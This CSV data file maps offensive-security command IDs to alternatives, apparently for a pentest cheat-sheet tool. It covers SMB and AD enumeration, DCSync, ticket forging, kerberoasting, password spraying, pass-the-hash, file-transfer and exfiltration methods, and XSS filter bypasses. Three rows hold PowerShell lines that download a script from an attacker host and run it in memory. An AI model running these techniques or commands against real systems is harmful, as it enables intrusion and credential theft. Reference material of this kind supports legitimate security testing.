"command_id","alternative_command_id"
"nmap-vuln-scan","nessus-scan"
"dns-enum","dnsenum-domain"
"smb-null-session-shares","smb-smbmap-recursive"
"smb-null-session-shares","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-null-session-shares"
"smb-crackmapexec-shares","smb-smbmap-recursive"
"smb-crackmapexec-shares","smb-enum4linux-full"
"smb-smbclient-connect","smb-mount-share"
"smb-smbclient-connect","smb-smbmap-recursive"
"smb-smbmap-recursive","smb-smbclient-connect"
"smb-smbmap-recursive","smb-mount-share"
"smb-mount-share","smb-smbclient-connect"
"smb-mount-share","smb-smbmap-recursive"
"curl-header-enum","whatweb-technology-detection"
"curl-header-enum","nmap-service-scan"
"whatweb-technology-detection","curl-header-enum"
"whatweb-technology-detection","nmap-service-scan"
"iptables-list-rules","ufw-status"
"iptables-list-rules","firewalld-list-all"
"iptables-allow-port","ufw-allow-port"
"ufw-status","iptables-list-rules"
"ufw-status","firewalld-list-all"
"ufw-allow-port","iptables-allow-port"
"firewalld-list-all","iptables-list-rules"
"firewalld-list-all","ufw-status"
"netsh-firewall-show","netsh-firewall-show-state"
"netsh-firewall-show-state","netsh-firewall-show"
"service-ssh-start-sysvinit","systemctl-start-ssh"
"nmap-localhost-verification","netstat-listening-tcp"
"nmap-localhost-verification","ss-listening-all"
"ssh-local-port-forward-inline","ssh-local-port-forward"
"crackmapexec-smb-framework","cme-smb-shares"
"wmic-os-version-specific","systeminfo-windows"
"wmic-os-version-specific","get-computerinfo"
"whoami-all-windows","whoami-priv"
"chisel-http-tunneling","ssh-dynamic-port-forward"
"chisel-http-tunneling","sshuttle-vpn"
"plink-remote-forward-windows","plink-remote-forward"
"proxychains-config-verify","proxychains-config"
"systemctl-start-ssh","service-ssh-start-sysvinit"
"ss-listening-ports","nmap-localhost-verification"
"ip-route","netstat-routing-table"
"nmap-port-check","curl-http-service-verification"
"plink-remote-forward","chisel-http-tunneling"
"ssh-connect-password","ssh-key-authentication"
"rustscan-fast-scan","nmap-quick-scan"
"rustscan-fast-scan","masscan-fast-scan"
"enum4linux-smb","enum4linux-ng"
"enum4linux-ng","enum4linux-smb"
"dnsrecon-domain","dnsenum-domain"
"dnsrecon-domain","dig-zone-transfer"
"ffuf-dir-fuzz","gobuster-dir-basic"
"ffuf-dir-fuzz","wfuzz-dir"
"gobuster-dir-basic","ffuf-dir-fuzz"
"gobuster-dir-basic","wfuzz-dir"
"wfuzz-dir","gobuster-dir-basic"
"wfuzz-dir","ffuf-dir-fuzz"
"php-http-server","ruby-http-server"
"ruby-http-server","php-http-server"
"powershell-wget","powershell-invoke-webrequest"
"socat-listener","nc-listener"
"hashid-identify","hash-identifier"
"smbexec-shell","psexec-shell"
"smbexec-shell","wmiexec-shell"
"secretsdump-hashes","ad-dcsync-mimikatz-single-user"
"secretsdump-hashes","ad-dcsync-impacket-secretsdump-user"
"sc-qc-service","get-service"
"ldap-dn-path-check","ldapsearch-ad"
"check-robots-txt","nikto-scan"
"awk-print","cut-fields"
"cut-fields","awk-print"
"base64-encode","base64-decode"
"base64-decode","base64-encode"
"xxd-hex","hexdump-file"
"hexdump-file","xxd-hex"
"od-octal-dump","xxd-hex"
"od-octal-dump","hexdump-file"
"pip-install","pip3-install"
"pip3-install","pip-install"
"yum-install","dnf-install"
"yum-install","apt-install"
"dnf-install","yum-install"
"dnf-install","apt-install"
"go-get","go-install"
"go-install","go-get"
"choco-install","winget-install"
"winget-install","choco-install"
"scoop-install","choco-install"
"scoop-install","winget-install"
"traceroute-host","tracert-windows"
"tracert-windows","traceroute-host"
"dig-dns","nslookup-dns"
"dig-dns","host-dns"
"nslookup-dns","dig-dns"
"nslookup-dns","host-dns"
"host-dns","dig-dns"
"host-dns","nslookup-dns"
"curl-url","wget-url"
"wget-url","curl-url"
"scp-file","rsync-files"
"rsync-files","scp-file"
"telnet-connect","nc-connect"
"chmod-executable","chmod-numeric-permissions"
"chmod-numeric-permissions","chmod-executable"
"chmod-writable","chmod-numeric-permissions"
"cp-file","rsync-files"
"cat-file","head-file"
"cat-file","tail-file"
"cat-file","less-file"
"head-file","cat-file"
"head-file","less-file"
"tail-file","cat-file"
"tail-file","less-file"
"less-file","cat-file"
"tar-extract","unzip-file"
"tar-extract","gunzip-decompress"
"unzip-file","tar-extract"
"gzip-compress","tar-create"
"gunzip-decompress","tar-extract"
"verify-curl-available","python-http-server"
"verify-curl-available","nc-file-transfer"
"verify-credentials","verify-credentials"
"verify-credentials","verify-credentials"
"verify-port-open","nmap-port-check"
"verify-smb-null-session","smb-crackmapexec-shares"
"ft-certutil-download","ft-powershell-iwr"
"ft-certutil-download","ft-powershell-webclient"
"ft-certutil-download","ft-bitsadmin-download"
"ft-powershell-iwr","ft-certutil-download"
"ft-powershell-iwr","ft-powershell-webclient"
"ft-powershell-webclient","ft-powershell-iwr"
"ft-powershell-webclient","ft-certutil-download"
"ft-smb-download","ft-certutil-download"
"ft-smb-download","ft-powershell-webclient"
"ft-bitsadmin-download","ft-certutil-download"
"ft-bitsadmin-download","ft-powershell-webclient"
"ft-powershell-upload","ft-smb-upload"
"ft-powershell-upload","ft-nc-send"
"ft-powershell-upload","exfil-powershell-base64"
"ft-smb-upload","ft-powershell-upload"
"ft-smb-upload","ft-nc-send"
"ft-curl-upload","ft-nc-send"
"ft-curl-upload","ft-scp-upload"
"ft-nc-receive","ft-uploadserver"
"ft-nc-receive","ft-smb-server"
"ft-nc-send","ft-curl-upload"
"ft-nc-send","ft-bash-dev-tcp"
"ft-powershell-tcp-send","ft-nc-send"
"ft-powershell-tcp-send","ft-powershell-upload"
"ft-powershell-tcp-send","ft-smb-upload"
"ft-file-verify-md5","sha256sum <FILE> (SHA-256, more secure but slower)"
"ft-file-verify-md5","Get-FileHash <FILE> (PowerShell on Windows)"
"ft-file-verify-md5","certutil -hashfile <FILE> MD5 (Windows built-in)"
"ft-powershell-execute-memory","IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)"
"ft-powershell-execute-memory","(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)"
"ft-powershell-execute-memory","IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw) (SMB-based)"
"ft-base64-encode","ft-nc-send"
"ft-base64-encode","ft-curl-upload"
"ft-scp-upload","ft-wget-download"
"ft-scp-upload","ft-curl-upload"
"ft-scp-download","ft-curl-upload"
"ft-scp-download","ft-nc-send"
"ft-wget-download","ft-curl-download"
"ft-wget-download","ft-bash-dev-tcp"
"ft-curl-download","ft-wget-download"
"ft-curl-download","ft-bash-dev-tcp"
"ft-bash-dev-tcp","ft-wget-download"
"ft-bash-dev-tcp","ft-curl-download"
"ft-python-http-server","php-http-server"
"ft-python-http-server","ruby-http-server"
"ft-smb-server","ft-python-http-server"
"ft-uploadserver","ft-smb-server"
"ft-uploadserver","ft-nc-receive"
"lsof-network-all","netstat-listening-tcp"
"lsof-network-all","ss-listening-all"
"lsof-listening-ports","netstat-listening-tcp"
"lsof-listening-ports","ss-listening-ports"
"lsof-port-specific","fuser-port-tcp"
"fuser-port-tcp","lsof-port-specific"
"netstat-listening-tcp","ss-listening-all"
"netstat-listening-tcp","lsof-listening-ports"
"ss-listening-all","netstat-listening-tcp"
"ss-listening-all","lsof-listening-ports"
"win-netstat-process-mapping","win-ps-netstat-process"
"win-ps-netstat-process","win-netstat-process-mapping"
"win-tasklist-pid","win-wmic-process-pid"
"win-tasklist-pid","win-ps-get-process"
"win-wmic-process-pid","win-tasklist-pid"
"systemctl-running-services","service-status-all-sysv"
"service-status-all-sysv","systemctl-running-services"
"win-sc-query-services","win-wmic-service-full"
"win-sc-query-services","win-ps-get-service"
"win-sc-query-all","win-wmic-service-full"
"win-sc-query-all","get-service"
"win-sc-query-config","win-wmic-service-path"
"win-wmic-service-full","win-sc-query-all"
"win-wmic-service-full","win-ps-get-service"
"win-wmic-service-path","win-sc-query-config"
"win-wmic-service-path","win-unquoted-service-paths"
"win-ps-get-service","win-sc-query-services"
"win-ps-get-service","win-wmic-service-full"
"win-ps-get-service-details","win-wmic-service-path"
"win-ps-get-service-details","win-sc-query-config"
"ps-grep-pattern","ps-aux-full"
"ps-grep-pattern","ps-grep-pattern"
"ps-grep-extract-pid","ps-grep-pattern"
"crontab-user-direct-read","crontab-user-list"
"less-etc-crontab","crontab-system-wide"
"tail-follow-syslog","journalctl-follow"
"journalctl-kernel-messages","dmesg-kernel-messages"
"journalctl-kernel-follow","dmesg-follow"
"ls-init-d","systemctl-list"
"top-snapshot-batch","ps-aux-full"
"ls-proc-fd-all","lsof-list"
"lsof-directory-non-recursive","lsof-directory-usage"
"crontab-system-wide","less-etc-crontab"
"win-schtasks-list-all","win-ps-scheduled-tasks"
"win-schtasks-list-all","get-scheduledtask"
"win-ps-scheduled-tasks","win-schtasks-list-all"
"tail-follow-log","tail-follow-multiple"
"tail-follow-log","journalctl-follow"
"journalctl-follow","tail-follow-log"
"grep-auth-failed","lastb-failed-logins"
"lastb-failed-logins","grep-auth-failed"
"journalctl-boot-messages","dmesg-kernel-messages"
"systemctl-list","service --status-all"
"systemctl-list","chkconfig --list"
"systemctl-list","ls-init-d"
"lsof-list","netstat -tulpn"
"lsof-list","ss -tulpn"
"lsof-list","ls-proc-fd-all"
"lsof-list","netstat-listening-ports"
"free-memory-human","cat-proc-meminfo"
"uptime-load-average","cat-proc-loadavg"
"lsof-directory-usage","fuser-directory-processes"
"fuser-directory-processes","lsof-directory-usage"
"who-logged-in","w-user-activity"
"lastlog-user-last","last-login-history"
"ps-aux-full","ps-ef-full"
"ps-aux-full","top-snapshot"
"ps-aux-full","pstree-hierarchy"
"ps-auxww-no-truncate","ps-ef-full"
"ps-ef-full","ps-aux-full"
"ps-ef-full","pstree-hierarchy"
"pstree-hierarchy","ps-ef-full"
"top-snapshot","ps-sort-cpu"
"win-tasklist-verbose","win-wmic-process-full"
"win-tasklist-verbose","win-ps-get-process"
"win-tasklist-services","win-wmic-service-full"
"win-tasklist-services","win-ps-get-service"
"win-wmic-process-full","win-ps-get-process-detailed"
"win-wmic-process-full","win-tasklist-verbose"
"win-ps-get-process","win-tasklist-verbose"
"win-ps-get-process","win-wmic-process-full"
"win-ps-get-process-detailed","win-wmic-process-full"
"import-powerview","import-sharphound"
"import-powerview","ldapsearch-ad"
"get-netdomain","ldapsearch-dump"
"get-netuser","net-user-domain-list"
"get-netuser","ps-ldapsearch-users"
"get-netuser","get-aduser"
"get-netgroup","net-group-domain-list"
"get-netgroup","ps-ldapsearch-groups"
"get-netgroup","get-adgroup"
"get-netcomputer","get-adcomputer"
"get-netcomputer","ps-ldapsearch-computers"
"invoke-sharefinder","smb-crackmapexec-shares"
"invoke-sharefinder","smb-enum"
"invoke-sharefinder","net-view-shares"
"get-netgpo","get-netgpo"
"get-domainsid","get-domainsid"
"kerbrute-userenum-ad","enum4linux-users-ad"
"kerbrute-userenum-ad","ldapsearch-users-ad"
"crackmapexec-rid-cycling","kerbrute-userenum-ad"
"crackmapexec-rid-cycling","enum4linux-users-ad"
"crackmapexec-rid-cycling","ldapsearch-users-ad"
"ldapsearch-users-ad","kerbrute-userenum-ad"
"ldapsearch-users-ad","enum4linux-users-ad"
"ldapsearch-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","kerbrute-userenum-ad"
"enum4linux-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","ldapsearch-users-ad"
"spray-passwords-ldap","crackmapexec-smb-spray"
"spray-passwords-ldap","kerbrute-passwordspray"
"spray-passwords-ldap","crackmapexec-winrm-spray"
"crackmapexec-smb-spray","spray-passwords-ldap"
"crackmapexec-smb-spray","kerbrute-passwordspray"
"crackmapexec-smb-spray","crackmapexec-winrm-spray"
"kerbrute-passwordspray","spray-passwords-ldap"
"kerbrute-passwordspray","crackmapexec-smb-spray"
"kerbrute-passwordspray","crackmapexec-winrm-spray"
"crackmapexec-winrm-spray","crackmapexec-smb-spray"
"crackmapexec-winrm-spray","spray-passwords-ldap"
"crackmapexec-winrm-spray","kerbrute-passwordspray"
"ad-dcsync-mimikatz-user","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-krbtgt","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-mimikatz-user"
"ad-golden-ticket-dcsync-krbtgt","ad-golden-ticket-lsa-dump-krbtgt"
"ad-golden-ticket-lsa-dump-krbtgt","ad-golden-ticket-dcsync-krbtgt"
"ad-golden-ticket-purge-tickets","kerberos-klist-purge"
"ad-golden-ticket-mimikatz-create","ad-golden-ticket-rubeus-create"
"ad-golden-ticket-rubeus-create","ad-golden-ticket-mimikatz-create"
"ad-golden-ticket-verify-klist","rubeus-klist-display"
"impacket-getnpusers-asreproast","rubeus-asreproast"
"impacket-getnpusers-asreproast","impacket-getnpusers-identify"
"impacket-getnpusers-identify","powerview-asreproast-identify"
"rubeus-asreproast","impacket-getnpusers-asreproast"
"powerview-asreproast-identify","impacket-getnpusers-identify"
"enter-pssession","invoke-command"
"invoke-command","enter-pssession"
"test-admin-share-access","net-use-admin-share"
"test-admin-share-access","dir-admin-share"
"copy-file-admin-share","copy-file-admin-share"
"ad-check-vss-service","ad-dcsync-ntds-credentials"
"ad-vssadmin-create-shadow","ad-vshadow-create-shadow"
"ad-vssadmin-create-shadow","ad-diskshadow-create-shadow"
"ad-vshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-vshadow-create-shadow","ad-diskshadow-create-shadow"
"ad-diskshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-diskshadow-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-vssadmin-create-shadow"
"ad-wmic-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-diskshadow-create-shadow"
"ad-dcsync-mimikatz-single-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-mimikatz-single-user","ad-dcsync-mimikatz-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-mimikatz-single-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-check-domain-admins","ad-dcsync-check-user-groups"
"ad-dcsync-check-domain-admins","ad-dcsync-check-replication-rights"
"ad-dcsync-check-user-groups","ad-dcsync-check-domain-admins"
"ad-dcsync-check-user-groups","ad-dcsync-check-replication-rights"
"ad-dcsync-check-replication-rights","ad-dcsync-check-domain-admins"
"ad-dcsync-check-replication-rights","ad-dcsync-check-user-groups"
"crackmapexec-validate-admin","kerbrute-validate-creds"
"crackmapexec-validate-admin","pth-evil-winrm"
"crackmapexec-validate-admin","ftp-connect"
"kerbrute-validate-creds","crackmapexec-validate-admin"
"kerbrute-validate-creds","ftp-connect"
"kerbrute-validate-creds","pth-evil-winrm"
"impacket-getuserspns-kerberoast","rubeus-kerberoast"
"impacket-getuserspns-kerberoast","powerview-kerberoast"
"impacket-getuserspns-list","setspn-list-user-spns"
"rubeus-kerberoast","impacket-getuserspns-kerberoast"
"rubeus-kerberoast","powerview-kerberoast"
"rubeus-kerberoast-aes","rubeus-kerberoast"
"powerview-kerberoast","rubeus-kerberoast"
"powerview-kerberoast","impacket-getuserspns-kerberoast"
"setspn-list-user-spns","impacket-getuserspns-list"
"crackmapexec-sam-dump","ad-sam-dump-reg-save"
"download-powerview","curl-download-powerview"
"curl-download-powerview","download-powerview"
"set-executionpolicy-bypass","powershell-ep-bypass-flag"
"powershell-ep-bypass-flag","set-executionpolicy-bypass"
"ad-dcsync-secretsdump-user","ad-dcsync-mimikatz-user"
"ad-dcsync-secretsdump-user","ad-dcsync-secretsdump-all"
"ad-dcsync-secretsdump-krbtgt","ad-dcsync-mimikatz-krbtgt"
"ad-dcsync-secretsdump-all","ad-dcsync-secretsdump-user"
"net-accounts-policy","enum4linux-policy"
"net-accounts-policy","crackmapexec-policy"
"net-accounts-policy","ldapsearch-policy"
"enum4linux-policy","net-accounts-policy"
"enum4linux-policy","crackmapexec-policy"
"enum4linux-policy","ldapsearch-policy"
"crackmapexec-policy","net-accounts-policy"
"crackmapexec-policy","enum4linux-policy"
"crackmapexec-policy","ldapsearch-policy"
"ldapsearch-policy","net-accounts-policy"
"ldapsearch-policy","enum4linux-policy"
"ldapsearch-policy","crackmapexec-policy"
"ad-silver-ticket-mimikatz-create","ad-silver-ticket-rubeus-create"
"ad-silver-ticket-mimikatz-create","overpass-mimikatz-pth"
"ad-silver-ticket-rubeus-create","ad-silver-ticket-mimikatz-create"
"ad-enumerate-spn-target","powerview-enumerate-spns"
"ad-enumerate-spn-target","impacket-getuserspns-list"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-crackmapexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-crackmapexec"
"xss-test-svg-onload","xss-test-body-onload"
"xss-test-svg-onload","xss-test-img-onerror"
"xss-test-svg-onload","xss-test-script-basic"
"xss-test-body-onload","xss-test-svg-onload"
"xss-test-body-onload","xss-test-img-onerror"
"xss-test-body-onload","xss-test-script-basic"
"xss-test-img-onerror","xss-test-svg-onload"
"xss-test-img-onerror","xss-test-body-onload"
"xss-test-img-onerror","xss-test-script-basic"
"xss-test-script-basic","xss-test-img-onerror"
"xss-test-script-basic","xss-test-svg-onload"
"xss-test-script-basic","xss-test-script-context-break"
"xss-test-script-context-break","xss-test-script-basic"
"xss-test-script-context-break","xss-test-event-context-break"
"xss-test-event-context-break","xss-test-script-context-break"
"xss-test-event-context-break","xss-test-img-onerror"
"xss-filter-bypass-case","xss-filter-bypass-encoding"
"xss-filter-bypass-case","xss-test-img-onerror"
